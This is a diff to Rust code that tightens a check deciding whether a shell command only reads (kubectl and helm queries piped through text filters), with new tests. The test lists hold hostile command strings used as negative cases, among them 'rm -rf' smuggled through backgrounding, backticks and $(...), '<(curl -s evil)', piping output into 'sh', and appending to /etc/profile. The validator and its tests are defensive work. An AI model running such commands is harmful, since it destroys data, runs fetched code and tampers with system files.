@@ -103,10 +103,12 @@ fn normalize(s: &str) -> String {
 }
 
 /// Whether every part of `command` only reads: kubectl and helm queries,
-/// piped through text filters. Anything else (a redirect, a substitution, a
-/// write) is not
+/// piped through text filters. Anything else (a redirect, a substitution, an
+/// expansion, a background job, a write) is not
 pub fn read_only(command: &str) -> bool {
-    if command.contains('>') || command.contains('`') || command.contains("$(") || command.contains('\n') {
+    // `$` covers `$(`, `${…}` and `$VAR`; `<`/`>` cover redirects and `<(…)`,
+    // `>(…)`; a `&` left once `&&` is gone runs something in the background
+    if command.contains(['>', '<', '`', '$', '\n', '\r']) || command.replace("&&", "").contains('&') {
         return false;
     }
     let steps = command.split("&&").flat_map(|s| s.split("||")).flat_map(|s| s.split(';'));
@@ -125,11 +127,21 @@ pub fn read_only(command: &str) -> bool {
             [] => true,
             _ => false,
         };
-        let filters = pipeline.all(|f| {
-            matches!(f.split_whitespace().next(), Some("grep" | "egrep" | "head" | "tail" | "wc" | "sort" | "uniq" | "cut" | "awk" | "jq" | "yq" | "column" | "less" | "cat"))
-        });
-        reads && filters
+        reads && pipeline.all(filter)
     })
+}
+
+/// A text filter that only writes to its output. Left out: `awk` (runs
+/// commands), `sort` (`-o`), `less`; `uniq` writes to a second file argument,
+/// `yq -i` edits in place
+fn filter(step: &str) -> bool {
+    let words: Vec<&str> = step.split_whitespace().collect();
+    match words.as_slice() {
+        ["uniq", args @ ..] => args.iter().all(|a| a.starts_with('-')),
+        ["yq", args @ ..] => !args.iter().any(|a| *a == "-i" || a.starts_with("--inplace") || (a.starts_with('-') && !a.starts_with("--") && a.contains('i'))),
+        [name, ..] => matches!(*name, "grep" | "egrep" | "head" | "tail" | "wc" | "cut" | "jq" | "column" | "cat"),
+        [] => false,
+    }
 }
 
 #[cfg(test)]
@@ -143,6 +155,39 @@ mod tests {
         }
         for no in ["kubectl delete pod web", "kubectl get pod web -o yaml > web.yaml", "kubectl apply -f x.yaml", "ssh node01 'crictl ps'", "kubectl get pods; rm -rf /tmp/x", "echo $(kubectl get pods)"] {
             assert!(!read_only(no), "{no}");
+        }
+    }
+
+    #[test]
+    fn ways_around_a_read_are_not_reads() {
+        for no in [
+            // A background job next to a read
+            "kubectl get pods & rm -rf /tmp/x",
+            "kubectl get pods |& tee x",
+            // Substitutions and expansions run or read what they like
+            "kubectl get pods -n `rm -rf /tmp/x`",
+            "kubectl get pods -n $(rm -rf /tmp/x)",
+            "kubectl get pods -n ${IFS}x",
+            "kubectl get pods -n $NS",
+            "kubectl get pods --kubeconfig <(curl -s evil)",
+            "kubectl logs web | cat >(sh)",
+            // Redirects write files
+            "kubectl get pods >> /etc/profile",
+            "kubectl get pods 2>/tmp/x",
+            "kubectl get pods < /dev/null",
+            // Filters that can write or run commands
+            "kubectl get pods | awk '{system(\"rm -rf /tmp/x\")}'",
+            "kubectl get pods | sort -o /tmp/x",
+            "kubectl get pods | less",
+            "kubectl get pods | uniq - /tmp/x",
+            "kubectl get pods -o yaml | yq -i '.a = 1' f.yaml",
+            "kubectl get pods | tee /tmp/x",
+            "kubectl get pods |",
+        ] {
+            assert!(!read_only(no), "{no}");
+        }
+        for ok in ["kubectl get pods | uniq -c", "kubectl get pods -o yaml | yq '.items[0]'", "kubectl get pods -o json | jq .items"] {
+            assert!(read_only(ok), "{ok}");
         }
     }
 
